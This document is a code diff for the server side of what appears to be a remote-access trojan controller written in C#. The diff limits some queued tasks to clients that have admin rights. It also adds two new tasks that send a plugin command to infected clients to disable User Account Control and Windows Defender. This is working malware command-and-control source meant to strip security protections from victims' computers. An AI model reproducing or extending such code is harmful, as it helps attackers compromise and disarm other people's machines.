@@ -380,10 +380,25 @@ namespace Server
                         {
                             if (!asyncTask.doneClient.Contains(client.ID))
                             {
-                                Debug.WriteLine("task executed");
-                                asyncTask.doneClient.Add(client.ID);
-                                SetExecution(asyncTask.id);
-                                ThreadPool.QueueUserWorkItem(client.Send, asyncTask.msgPack);
+                                if (client.Admin)
+                                {
+                                    Debug.WriteLine("task executed");
+                                    asyncTask.doneClient.Add(client.ID);
+                                    SetExecution(asyncTask.id);
+                                    ThreadPool.QueueUserWorkItem(client.Send, asyncTask.msgPack);
+                                }
+                                else if (!client.Admin && !asyncTask.admin)
+                                {
+                                    Debug.WriteLine("task executed");
+                                    asyncTask.doneClient.Add(client.ID);
+                                    SetExecution(asyncTask.id);
+                                    ThreadPool.QueueUserWorkItem(client.Send, asyncTask.msgPack);
+                                }
+                                else 
+                                {
+                                    Debug.WriteLine("task can't executed");
+                                };
+                                
                             }
                         }
                         await Task.Delay(15 * 1000);
@@ -431,7 +446,7 @@ namespace Server
                     Program.form1.listView4.Items.Add(lv);
                     Program.form1.listView4.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);
 
-                    getTasks.Add(new AsyncTask(msgpack.Encode2Bytes(), lv.ToolTipText));
+                    getTasks.Add(new AsyncTask(msgpack.Encode2Bytes(), lv.ToolTipText, false));
                 }
             }
             catch (Exception ex)
@@ -486,7 +501,7 @@ namespace Server
                     Program.form1.listView4.Items.Add(lv);
                     Program.form1.listView4.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);
 
-                    getTasks.Add(new AsyncTask(msgpack.Encode2Bytes(), lv.ToolTipText));
+                    getTasks.Add(new AsyncTask(msgpack.Encode2Bytes(), lv.ToolTipText, false));
                 }
                 formSend.Close();
                 formSend.Dispose();
@@ -536,7 +551,7 @@ namespace Server
                     Program.form1.listView4.Items.Add(lv);
                     Program.form1.listView4.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);
 
-                    getTasks.Add(new AsyncTask(msgpack.Encode2Bytes(), lv.ToolTipText));
+                    getTasks.Add(new AsyncTask(msgpack.Encode2Bytes(), lv.ToolTipText, false));
                 }
             }
             catch (Exception ex)
@@ -1830,7 +1845,7 @@ namespace Server
                 Program.form1.listView4.Items.Add(lv);
                 Program.form1.listView4.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);
 
-                getTasks.Add(new AsyncTask(msgpack.Encode2Bytes(), lv.ToolTipText));
+                getTasks.Add(new AsyncTask(msgpack.Encode2Bytes(), lv.ToolTipText, false));
             }
             catch (Exception ex)
             {
@@ -1902,7 +1917,7 @@ namespace Server
                     Program.form1.listView4.Items.Add(lv);
                     Program.form1.listView4.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);
 
-                    getTasks.Add(new AsyncTask(msgpack.Encode2Bytes(), lv.ToolTipText));
+                    getTasks.Add(new AsyncTask(msgpack.Encode2Bytes(), lv.ToolTipText, false));
                 }
             }
             catch (Exception ex)
@@ -2016,7 +2031,7 @@ namespace Server
                     Program.form1.listView4.Items.Add(lv);
                     Program.form1.listView4.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);
 
-                    getTasks.Add(new AsyncTask(msgpack.Encode2Bytes(), lv.ToolTipText));
+                    getTasks.Add(new AsyncTask(msgpack.Encode2Bytes(), lv.ToolTipText,false));
                 }
             }
             catch (Exception ex)
@@ -2057,7 +2072,87 @@ namespace Server
                 Program.form1.listView4.Items.Add(lv);
                 Program.form1.listView4.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);
 
-                getTasks.Add(new AsyncTask(msgpack.Encode2Bytes(), lv.ToolTipText));
+                getTasks.Add(new AsyncTask(msgpack.Encode2Bytes(), lv.ToolTipText, false));
+            }
+            catch (Exception ex)
+            {
+                MessageBox.Show(ex.Message);
+                return;
+            }
+        }
+
+        private void disableUACToolStripMenuItem1_Click(object sender, EventArgs e)
+        {
+            try
+            {
+                MsgPack packet = new MsgPack();
+                packet.ForcePathObject("Pac_ket").AsString = "disableUAC";
+
+                MsgPack msgpack = new MsgPack();
+                msgpack.ForcePathObject("Pac_ket").AsString = "plu_gin";
+                msgpack.ForcePathObject("Dll").AsString = (GetHash.GetChecksum(@"Plugins\Extra.dll"));
+                msgpack.ForcePathObject("Msgpack").SetAsBytes(packet.Encode2Bytes());
+
+                ListViewItem lv = new ListViewItem();
+                lv.Text = "DisableUAC:";
+                lv.SubItems.Add("0");
+                lv.ToolTipText = Guid.NewGuid().ToString();
+
+                if (listView4.Items.Count > 0)
+                {
+                    foreach (ListViewItem item in listView4.Items)
+                    {
+                        if (item.Text == lv.Text)
+                        {
+                            return;
+                        }
+                    }
+                }
+
+                Program.form1.listView4.Items.Add(lv);
+                Program.form1.listView4.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);
+
+                getTasks.Add(new AsyncTask(msgpack.Encode2Bytes(), lv.ToolTipText, true));
+            }
+            catch (Exception ex)
+            {
+                MessageBox.Show(ex.Message);
+                return;
+            }
+        }
+
+        private void disableWDToolStripMenuItem1_Click(object sender, EventArgs e)
+        {
+            try
+            {
+                MsgPack packet = new MsgPack();
+                packet.ForcePathObject("Pac_ket").AsString = "disableDefedner";
+
+                MsgPack msgpack = new MsgPack();
+                msgpack.ForcePathObject("Pac_ket").AsString = "plu_gin";
+                msgpack.ForcePathObject("Dll").AsString = (GetHash.GetChecksum(@"Plugins\Extra.dll"));
+                msgpack.ForcePathObject("Msgpack").SetAsBytes(packet.Encode2Bytes());
+
+                ListViewItem lv = new ListViewItem();
+                lv.Text = "DisableDefedner:";
+                lv.SubItems.Add("0");
+                lv.ToolTipText = Guid.NewGuid().ToString();
+
+                if (listView4.Items.Count > 0)
+                {
+                    foreach (ListViewItem item in listView4.Items)
+                    {
+                        if (item.Text == lv.Text)
+                        {
+                            return;
+                        }
+                    }
+                }
+
+                Program.form1.listView4.Items.Add(lv);
+                Program.form1.listView4.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);
+
+                getTasks.Add(new AsyncTask(msgpack.Encode2Bytes(), lv.ToolTipText, true));
             }
             catch (Exception ex)
             {
